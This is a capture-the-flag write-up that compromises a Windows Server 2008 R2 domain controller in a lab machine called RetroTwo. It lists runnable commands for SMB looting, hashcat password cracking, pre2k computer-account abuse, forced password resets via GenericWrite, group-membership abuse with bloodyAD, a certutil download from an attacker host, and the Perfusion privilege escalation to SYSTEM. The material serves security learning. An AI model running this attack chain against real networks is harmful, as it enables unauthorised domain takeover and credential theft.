# RetroTwo: Easy

```sh
sudo vim /etc/hosts
# add retrotwo.htb

nmap -T4 -p- -A -Pn -v retrotwo.htb
```

* open ports & services:

    * 53/tcp: domain: Microsoft DNS 6.1.7601
    * 88/tcp: kerberos-sec: Microsoft Windows Kerberos
    * 135/tcp: msrpc: Microsoft Windows RPC
    * 139/tcp: netbios-ssn: Microsoft Windows netbios-ssn
    * 389/tcp: ldap: Microsoft Windows Active Directory LDAP
    * 445/tcp: microsoft-ds: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds
    * 464/tcp: kpasswd5?
    * 593/tcp: ncacn_http: Microsoft Windows RPC over HTTP 1.0
    * 636/tcp: tcpwrapped
    * 3268/tcp: ldap: Microsoft Windows Active Directory LDAP
    * 3269/tcp: tcpwrapped
    * 3389/tcp: ssl/ms-wbt-server?
    * 5722/tcp: msrpc: Microsoft Windows RPC
    * 9389/tcp: mc-nmf: .NET Message Framing

* ```nmap``` scan gives the domain 'retro2.vl': update it in ```/etc/hosts```

* the ```smb-os-discovery``` module from ```nmap``` also detects the OS as "Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)"

* as this is a very old Windows version, it is likely that it is vulnerable to older exploits like EternalBlue

* we can test that by trying the EternalBlue (MS17-010) exploit:

    ```sh
    msfconsole -q

    search eternalblue

    use 0

    set RHOSTS retrotwo.htb

    set LHOST 10.10.14.95

    run
    # this fails
    ```

* the target is not vulnerable to EternalBlue, and Googling for other exploits for this specific version does not give much info

* we can continue enumerating other services to check for any leads

* enumerating SMB and RPC:

    ```sh
    rpcinfo -p retrotwo.htb
    # no luck

    rpcclient -U "" retrotwo.htb
    # we are able to login
    # but none of the queries work

    smbmap -H retrotwo.htb
    # no info

    smbclient -N -L //retrotwo.htb
    # lists multiple shares

    # check each of the shares

    smbclient //retrotwo.htb/ADMIN$
    # NT_STATUS_ACCESS_DENIED

    smbclient //retrotwo.htb/C$
    # NT_STATUS_ACCESS_DENIED

    smbclient //retrotwo.htb/IPC$
    # able to login, but listing gives error "NT_STATUS_INVALID_PARAMETER"

    smbclient //retrotwo.htb/NETLOGON
    # NT_STATUS_INVALID_PARAMETER

    smbclient //retrotwo.htb/SYSVOL
    # NT_STATUS_INVALID_PARAMETER

    smbclient //retrotwo.htb/Public
    # this works

    dir
    # folders 'DB' and 'Temp'

    cd DB

    dir
    # we have a file here

    get staff.accdb

    cd ..

    cd Temp

    dir
    # no files here

    exit
    ```

* ```smbclient``` is able to list multiple shares: however only the 'Public' share is accessible properly

* the 'Public' share contains a 'DB' folder with the file 'staff.accdb': we can fetch it to attacker and check it further

* Google shows that '.accdb' is the Microsoft Access DB file format

* we can try using online ACCDB file viewer tools to view this file, but they do not work

* this means the file could be password-protected

* further Googling shows that Microsoft Office-related files can be cracked using tools like ```john``` and ```hashcat``` - in this case, we need to use ```office2john```:

    ```sh
    office2john staff.accdb > accdbhash

    less accdbhash
    # MS Office 2013 hash format
    # hashcat mode 9600

    hashcat -m 9600 accdbhash /usr/share/wordlists/rockyou.txt
    # gives the error "no hashes loaded"

    vim accdbhash
    # rectify the hash format to include only the hash part
    # remove the part before the initial colon - that is the filename

    hashcat -m 9600 accdbhash /usr/share/wordlists/rockyou.txt
    # this works
    ```

* ```hashcat``` is able to crack the hash and we get cleartext 'class08'

* there are no online tools to view password-protected Access DB files, so we need to use alternate command-line tools in Linux to view '.accdb' files

* one of the tools that supported password-protection in this case is [jetdb](https://crates.io/crates/jetdb): but it did not work properly for certain commands

* we can open the file in Microsoft Access as there are no options left; the file prompts a password, and 'class08' works

* there is a table 'StaffMembers' but it does not include any data; we do have a module 'Staff' though

* checking the VBA module code, we get plaintext creds 'ldapreader:ppYaVcB5R'

* as we have creds, we can first check for RCE:

    ```sh
    evil-winrm -u ldapreader -p ppYaVcB5R -i retrotwo.htb
    # this does not work

    crackmapexec smb retrotwo.htb -u ldapreader -p 'ppYaVcB5R' -x 'whoami' --exec-method smbexec
    # the creds are valid, but command is not executed

    crackmapexec smb retrotwo.htb -u ldapreader -p 'ppYaVcB5R'
    # this confirms the creds are valid
    ```

* we can try checking the SMB shares again with 'ldapreader' user, but we do not get anything interesting

* as the username suggests LDAP, we can enumerate LDAP:

    ```sh
    ldapsearch -x -H ldap://retrotwo.htb -s base namingcontexts
    # get naming context

    ldapsearch -x -H ldap://retrotwo.htb -b 'DC=retro2,DC=vl' -D 'ldapreader@retro2.vl' -w 'ppYaVcB5R' > ldapoutput
    # this gives a lot of output, so we can save it to a file

    less ldapoutput
    ```

* the LDAP enumeration gives a lot of output: and we get several findings:

    * there is a non-default user 'admin' who is also part of the Administrators group

    * BLN01 is the DC (domain controller) of the AD environment

    * 'services' is part of 'Remote Desktop Users' group

    * the 'Domain Admins' group includes multiple members: 'alex.scott', 'caroline.james', and 'administrator'

    * a non-default group for 'Pre-Windows 2000 Compatible Access' is also mentioned

    * there is a non-default OU 'staff' with several members

    * there are multiple computers listed: 'ADMWS01', 'FS01' & 'FS02'

* there are no cleartext passwords or secrets listed in the LDAP output, so we have to check for other ways to get a foothold

* checking the non-default OU 'Pre-Windows 2000 Compatible Access', it is described as 'a backward compatibility group which allows read access on all users and groups in the domain'

* Googling for Pre-Windows 2000 Compatible Access leads to [this post which mentions its risks](https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/): this includes pre-created computer accounts with weak passwords (account name in lowercase)

* Googling for exploits associated with Pre2k compatibility leads to [this post](https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/): we can try it:

    * enumerate the pre-created computer accounts using the [pre2k](https://github.com/garrettfoster13/pre2k) tool:

        ```sh
        git clone https://github.com/garrettfoster13/pre2k.git

        cd pre2k/

        pip3 install .

        pre2k auth -u ldapreader -p ppYaVcB5R -dc-ip retrotwo.htb -d retro2.vl
        # run pre2k in authenticated mode
        ```
    
    * the ```pre2k``` tool is to able to find valid pre-created computer accounts for FS01 and FS02: as the valid creds 'retro2.vl\FS01$:fs01' and 'retro2.vl\FS02$:fs02' are shown

    * we can choose any one of the accounts: trying with FS01, we can confirm the creds first:

        ```sh
        nxc smb retro2.vl -u FS01$ -p fs01
        ```
    
    * as expected, this gives the error 'STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT': this requires changing the password before logging in

    * we can change the password using ```impacket``` tools:

        ```sh
        sudo changepasswd.py 'retro2.vl/FS01$@retrotwo.htb' -newpass 'TestPass123!' -p rpc-samr
        # this asks for old password - enter 'fs01'
        # this works
        ```
    
    * confirm the new creds work:

        ```sh
        nxc smb retro2.vl -u FS01$ -p 'TestPass123!'
        ```
    
    * we can try to login as 'FS01$' via ```evil-winrm```, but that does not work

* as we cannot login via the pre-created computer accounts, we have to check further for getting a foothold

* we can try enumeration using ```bloodhound``` - as we do not have a shell, we need to use ```bloodhound-python```:

    ```sh
    sudo bloodhound-python -u 'ldapreader' -p 'ppYaVcB5R' -ns 10.129.183.69 -d retro2.vl -c all
    # this creates JSON files

    zip -r retrotwo.zip *.json
    # archive the JSON files to a ZIP

    sudo neo4j start

    bloodhound
    ```

* log into the ```bloodhound``` GUI and upload the ZIP file data to populate the nodes

* search for the nodes 'ldapreader', 'FS01$' and 'FS02$': and mark them as 'Owned'

* now we can check for the pre-built search queries for any shortest paths

* checking the 'shortest path from owned principals', if we check for the 'ldapreader' owned node, we do not get any path

* however, checking from the 'FS01$' or 'FS02$' nodes for shortest paths gives us the following relations:

    * 'FS01$': 'MemberOf': 'Domain Computers' group
    * 'Domain Computers' group: 'GenericWrite': 'ADMWS01$'
    * 'ADMWS01$': 'AddSelf': 'services' group
    * 'services' user: 'CanRDP': 'BLN01$'

* we can click on each of the edges/relations to know more on how to abuse the access policy, using the 'Help' option

* we can first abuse GenericWrite to gain control over 'ADMWS01$' account: we can try the RBCD (Resource-Based Constrained Delegation) attack:

    ```sh
    addcomputer.py -computer-name 'TESTING$' -computer-pass 'Testing123!' -dc-ip 10.129.183.69 retro2.vl/FS01$:'TestPass123!'
    # this adds the computer

    rbcd.py -delegate-from 'TESTING$' -delegate-to 'ADMWS01$' -dc-ip 10.129.183.69 -action write retro2.vl/FS01$:'TestPass123!'
    # this fails with the error
    # "invalid attribute type msDS-AllowedToActOnBehalfOfOtherIdentity"
    ```

* the RBCD attack does not work in this case, possibly due to an older version of Windows

* we can exploit GenericWrite in another way: by changing the password for the target account

* we can use ```net``` tool to change the password for 'ADMWS01$':

    ```sh
    net rpc password 'ADMWS01$' 'AdminPass1!' -U retro2.vl/FS01$%'TestPass123!' -S 10.129.183.69
    # this changes the password for the target account

    # confirm the change worked
    nxc smb retro2.vl -u ADMWS01$ -p 'AdminPass1!'
    ```

* the password change using ```net``` works, and now 'ADMWS01$' is under our control

* next, as this computer account can add anyone to the 'services' group, we can add the 'ldapreader' user to this group, so that we can RDP to the domain controller 'BLN01.retro2.vl'

* we can use [bloodyAD](https://github.com/CravateRouge/bloodyAD) to achieve this:

    ```sh
    pip install bloodyAD

    bloodyAD --host 10.129.183.69 -d retro2.vl -u 'ADMWS01$' -p 'AdminPass1!' add groupMember 'services' 'ldapreader'
    # adds 'ldapreader' user to 'services' group
    # this works
    ```

* now, we can try to RDP into the DC as 'ldapreader':

    ```sh
    xfreerdp /u:ldapreader /p:'ppYaVcB5R' /v:retrotwo.htb /d:bln01.retro2.vl
    # this gives a TLS error
    # "transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED"
    ```

* Googling on the error code from ```xfreerdp``` shows that we can downgrade the security level by adding ```/tls-seclevel:0``` to allow older crypto standards:

    ```sh
    xfreerdp /u:ldapreader /p:'ppYaVcB5R' /v:retrotwo.htb /d:bln01.retro2.vl /tls-seclevel:0
    # this works
    ```

* we have RDP access now; we can get the user flag from ```C:\user.txt```

* we can attempt initial enumeration using ```winpeas``` - fetch the executable from attacker:

    ```cmd
    # in command prompt

    certutil.exe -urlcache -f http://10.10.14.95:8000/winPEASx64.exe winpeas.exe

    .\winpeas.exe > winpeas.txt
    # write output to file for readability
    ```

* findings from ```winpeas```:

    * multiple older vulnerabilities detected for the box as it is running an older release
    * no AV detected
    * write permissions over service registries: ```HKLM\system\currentcontrolset\services\Dnscache``` & ```HKLM\system\currentcontrolset\services\RpcEptMapper```

* most of the older vulnerabilities are very old so they would not work on this box

* checking the service registries, if we Google the names along with the version of the box: "Windows Server 2008 R2 Datacenter 6.1.7601 Service Pack 1 Build 7601", we get an [article on exploiting RpcEptMapper](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

* the post shows that the registry services for ```Dnscache``` and ```RpcEptMapper``` can be exploited to load a malicious DLL: further exploit steps are mentioned in [this exploit](https://www.exploit-db.com/exploits/50517), which links to [this tool](https://github.com/itm4n/Perfusion)

* we can try the exploit with the Perfusion tool:

    ```cmd
    # prepare and fetch the executable from attacker

    .\Perfusion.exe -c cmd -i
    # this works

    whoami
    # nt authority\system

    type C:\Users\Administrator\Desktop\root.txt
    # root flag
    ```
